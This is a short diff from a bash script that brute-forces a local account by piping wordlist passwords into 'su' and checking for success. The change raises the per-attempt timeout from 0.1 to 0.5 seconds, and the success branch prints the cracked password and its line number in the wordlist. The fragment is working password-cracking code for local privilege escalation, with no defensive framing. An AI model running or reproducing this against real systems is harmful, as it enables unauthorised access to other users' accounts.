@@ -96,7 +96,7 @@ while read PASSWORD; do
     LINE=$((LINE + 1))
     PROGRESS=$((LINE * 100 / SIZ))
     echo -ne "\r$YELLOW    $LINE/$SIZ/$PROGRESS%/$PASSWORD                              $END"
-    echo "$PASSWORD" | timeout 0.1 bash -c "su $USERNAME -c whoami &>/dev/null"
+    echo "$PASSWORD" | timeout 0.5 bash -c "su $USERNAME -c whoami &>/dev/null"
   if [ $? -eq 0 ]; then
     F1=$(/usr/bin/cat $WORDLIST | grep "^$PASSWORD$" -n | cut -d ":" -f 1)
     echo -e "\n$BOX1 $RED$VAR15 $GREEN$PASSWORD$RED $VAR16 $GREEN$F1"
